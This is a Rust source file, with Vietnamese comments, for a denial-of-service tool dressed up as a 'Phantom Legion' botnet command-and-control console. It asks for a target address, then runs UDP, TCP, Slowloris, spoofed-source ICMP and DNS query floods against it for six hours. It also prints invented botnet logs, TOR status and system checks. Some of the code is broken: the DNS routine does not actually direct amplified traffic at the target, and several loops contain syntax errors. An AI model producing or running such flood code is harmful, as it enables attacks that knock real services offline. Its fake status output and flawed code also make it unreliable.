use rand::Rng;
use std::net::{UdpSocket, TcpStream};
use std::thread;
use std::time::{Duration, Instant};
use std::sync::atomic::{AtomicUsize, Ordering};
use std::io::{self, Write, BufRead};
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4::MutableIpv4Packet;
use pnet::transport::{TransportChannelType, transport_channel};
use faker_rand::en_us::internet::Ipv4;
use reqwest::blocking::Client;
use std::collections::HashMap;
use rayon::prelude::*;
use tokio::runtime::Runtime;
use futures::future::join_all;
use serde::{Serialize, Deserialize};

// Cấu hình tấn công - Level"hủy diệt"
const TARGET_PORT: u16 = 7777;
const NUM_BOTS: usize = 1_000_000;
const FLOOD_DURATION: u64 = 21600;
const PACKET_SIZE: usize = 1_048_576;
const THREADS_PER_ATTACK: usize = 50_000;
const BOTNET_DELAY_US: u64 = 500;
const TOR_PROXY: &str ="socks5://127.0.0.1:9050";

// Biến toàn cục
static PACKETS_SENT: AtomicUsize = AtomicUsize::new(0);
static ACTIVE_BOTS: AtomicUsize = AtomicUsize::new(0);
static BOTNET_C2_KEY: &str ="C2_AUTH_X9P7K4M2_VIP";

// Cấu hình C2
#[derive(Serialize, Deserialize)]
struct C2Config {
    target_ip: String,
    attack_type: String,
    duration: u64,}
// Giao diện C2 Botnet đỉnh cao, giả lập tổ chức lớn
fn display_c2_interface(config: &C2Config) {
    println!("\x1b[31m======================================================================\x1b[0m");
    println!("\x1b[31m   DARKNET C2 - Botnet Command & Control - Phantom Legion v9.3      \x1b[0m");
    println!("\x1b[31m   [Encrypted Onion Routing] - Blackhat Syndicate - TOR Layer 3    \x1b[0m");
    println!("\x1b[31m   Auth Key: {} | Target: {}:{} | Vector: {}   \x1b[0m", 
             BOTNET_C2_KEY, config.target_ip, TARGET_PORT, config.attack_type);
    println!("\x1b[31m======================================================================\x1b[0m");
    println!("\x1b[32m[SYS] Phantom Nodes syncing... DARKNET CORE ONLINE - BEEP BEEP\x1b[0m");}
// Log botnet giả lập kiểu tổ chức lớn
fn fake_botnet_log() {
    let bot_id = format!("PHANTOM-{}", rand::thread_rng().gen_range(1000..9999));
    let fake_ip = Ipv4::fake().to_string();
    let regions = ["DarkHub_RU","ShadowNode_US","GhostRelay_CN","AbyssLink_EU"];
    let region = regions[rand::thread_rng().gen_range(0..regions.len())];
    println!("\x1b[33m[{}] Deployed | IP: {} | Relay: {} | Status: Locked On\x1b[0m", bot_id, fake_ip, region);}
// Fake system check để tăng độ"pro"
fn fake_system_check() {
    println!("\x1b[36m[DIAG] Verifying TOR tunnel integrity... 98% stable\x1b[0m");
    println!("\x1b[36m[DIAG] Spoofing IP pool... 1,237,489 nodes masked\x1b[0m");
    println!("\x1b[36m[DIAG] Payload encryption... AES-256 enabled\x1b[0m");}
// Lấy input
fn get_target() -> C2Config {
    println!("\x1b[33m[C2] Enter Target IP/Hostname: \x1b[0m");
    io::stdout().flush().unwrap();
    let mut ip = String::new();
    io::stdin().lock().read_line(&mut ip).unwrap();
    let target_ip = ip.trim().to_string();

    println!("\x1b[33m[C2] Select Attack Vector (UDP/TCP/HTTP/ICMP/DNS/SLOW): \x1b[0m");
    io::stdout().flush().unwrap();
    let mut attack = String::new();
    io::stdin().lock().read_line(&mut attack).unwrap();

    let config = C2Config {
        target_ip,
        attack_type: attack.trim().to_string(),
        duration: FLOOD_DURATION,};    display_c2_interface(&config);
    fake_system_check(); // Giả lập check hệ thống
    for_ in 0..5 { fake_botnet_log();} // Log botnet giả lập
    config}
// Botnet phân tán
async fn spawn_botnet(ip: String, attack_type: fn(&str, &HashMap<String, String>), bot_info: HashMap<String, String>) {
    let bot_id = format!("PHANTOM-{}", rand::thread_rng().gen_range(1000..9999));
    println!("\x1b[31m[{}] Engaged | IP: {} | Payload: Legion Strike | Targeting {}...\x1b[0m",
             bot_id, bot_info["IP"], ip);
    attack_type(&ip, &bot_info);
    println!("\x1b[31m[{}] Disengaged.\x1b[0m", bot_id);}
// Main async
fn main() {
    let config = get_target();
    println!("\x1b[32m[C2] Target Locked: {}:{}\x1b[0m", config.target_ip, TARGET_PORT);
    println!("\x1b[32m[C2] Legion Size: {} nodes | Duration: {}s\x1b[0m", NUM_BOTS, config.duration);
    println!("\x1b[32m[C2] Initiating Phantom Strike... CORE ACTIVATED\x1b[0m");

    let rt = Runtime::new().unwrap();
    rt.block_on(async {
        let attacks = vec![
            (config.target_ip.clone(), udp_flood),
            (config.target_ip.clone(), tcp_syn_flood),
            (config.target_ip.clone(), slowloris_flood),
            (config.target_ip.clone(), icmp_flood),
            (config.target_ip.clone(), dns_amplification),];        let mut tasks = Vec::new();
        for (ip, attack) in attacks {
            for_ in 0..THREADS_PER_ATTACK {
                let ip_clone = ip.clone();
                let mut bot_info = HashMap::new();
                bot_info.insert("IP".to_string(), Ipv4::fake().to_string());
                bot_info.insert("Region".to_string(),"DarkNode_X".to_string());
                tasks.push(tokio::spawn(spawn_botnet(ip_clone, attack, bot_info)));}        }
        join_all(tasks).await;
    });

    thread::spawn(stats_display);
    thread::sleep(Duration::from_secs(config.duration));
    println!("\n\x1b[31m[C2] Strike Completed. Packets Deployed: {}\x1b[0m", PACKETS_SENT.load(Ordering::SeqCst));}
// UDP Flood
fn udp_flood(target_ip: &str,_bot_info: &HashMap<String, String>) {
    let socket = UdpSocket::bind("0.0.0.0:0").unwrap();
    let payload: Vec<u8> = (0..PACKET_SIZE).map(|_| rand::thread_rng().gen()).collect();
    let end_time = Instant::now() + Duration::from_secs(FLOOD_DURATION);
    while Instant::now() < end_time {
        socket.send_to(&payload, (target_ip, TARGET_PORT)).unwrap();
        PACKETS_SENT.fetch_add(1, Ordering::SeqCst);
        thread::sleep(Duration::from_micros(BOTNET_DELAY_US));}}

// TCP SYN Flood
fn tcp_syn_flood(target_ip: &str,_bot_info: &HashMap<String, String>) {
    let end_time = Instant::now() + Duration::from_secs(FLOOD_DURATION);
    while Instant::now() < end_time {
        if let Ok(mut stream) = TcpStream::connect((target_ip, TARGET_PORT)) {
            stream.set_nonblocking(true).unwrap();
            PACKETS_SENT.fetch_add(1, Ordering::SeqCst);}        thread::sleep(Duration::from_micros(BOTNET_DELAY_US));}}

// Slowloris Flood - Tấn công từ từ
fn slowloris_flood(target_ip: &str, bot_info: &HashMap<String, String>) {
    let end_time = Instant::now() + Duration::from_secs(FLOOD_DURATION);
    while Instant::now() < end_time {
        if let Ok(mut stream) = TcpStream::connect((target_ip, TARGET_PORT)) {
            stream.write_all(format!("GET / HTTP/1.1\r\nHost: {}\r\nX-Forwarded-For: {}\r\n", target_ip, bot_info["IP"]).as_bytes()).unwrap();
            PACKETS_SENT.fetch_add(1, Ordering::SeqCst);
            thread::sleep(Duration::from_millis(500));}    }}
// ICMP Flood
fn icmp_flood(target_ip: &str,_bot_info: &HashMap<String, String>) {
    let (mut tx, _) = transport_channel(65535, TransportChannelType::Layer4(
        pnet::transport::TransportProtocol::Ipv4(IpNextHeaderProtocols::Icmp)
    )).unwrap();
    let end_time = Instant::now() + Duration::from_secs(FLOOD_DURATION);
    let mut buffer = [0u8; 8192];
    let mut packet = MutableIpv4Packet::new(&mut buffer).unwrap();
    packet.set_version(4);
    packet.set_header_length(5);
    packet.set_total_length(8192);
    packet.set_ttl(255);
    packet.set_next_level_protocol(IpNextHeaderProtocols::Icmp);
    packet.set_destination(target_ip.parse().unwrap());

    while Instant::now() < end_time {
        packet.set_source(Ipv4::fake().into());
        tx.send_to(packet.clone(), target_ip.parse().unwrap()).unwrap();
        PACKETS_SENT.fetch_add(1, Ordering::SeqCst);
        thread::sleep(Duration::from_micros(BOTNET_DELAY_US));}}

// DNS Amplification
fn dns_amplification(target_ip: &str,_bot_info: &HashMap<String, String>) {
    let socket = UdpSocket::bind("0.0.0.0:0").unwrap();
    let dns_servers = ["8.8.8.8","1.1.1.1","9.9.9.9","208.67.222.222"];
    let payload = vec![
        0xDE, 0xAD, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x03, 0x77, 0x77, 0x77, 0x07, 0x65, 0x78, 0x61, 0x6d, 0x70, 0x6c, 0x65,
        0x03, 0x63, 0x6f, 0x6d, 0x00, 0x00, 0xFF, 0x00, 0x01,];    let end_time = Instant::now() + Duration::from_secs(FLOOD_DURATION);
    while Instant::now() < end_time {
        for dns in dns_servers.iter() {
            socket.send_to(&payload, (*dns, 53)).unwrap();
            PACKETS_SENT.fetch_add(100, Ordering::SeqCst);}        thread::sleep(Duration::from_micros(BOTNET_DELAY_US));}}

// Dashboard C2 kiểu tổ chức lớn
fn stats_display() {
    let start_time = Instant::now();
    while Instant::now() < start_time + Duration::from_secs(FLOOD_DURATION) {
        let elapsed = Instant::now().duration_since(start_time).as_secs();
        let packets = PACKETS_SENT.load(Ordering::SeqCst);
        let bots = ACTIVE_BOTS.load(Ordering::SeqCst);
        let bandwidth = (packets as u64* PACKET_SIZE as u64* 8 / elapsed.max(1)) / 1_000_000;
        println!("\x1b[36m[C2 Phantom Dashboard]\x1b[0m");
        println!("\x1b[36m| Packets Deployed: {} | Active Nodes: {} | Elapsed: {}s |\x1b[0m", packets, bots, elapsed);
        println!("\x1b[36m| Strike Rate: {} pkt/s | Bandwidth: ~{} Mbps |\x1b[0m", packets / elapsed.max(1), bandwidth);
        println!("\x1b[36m| [SYS] Dark Pool: Stable | TOR Relay: Active |\x1b[0m");
        thread::sleep(Duration::from_secs(1));}}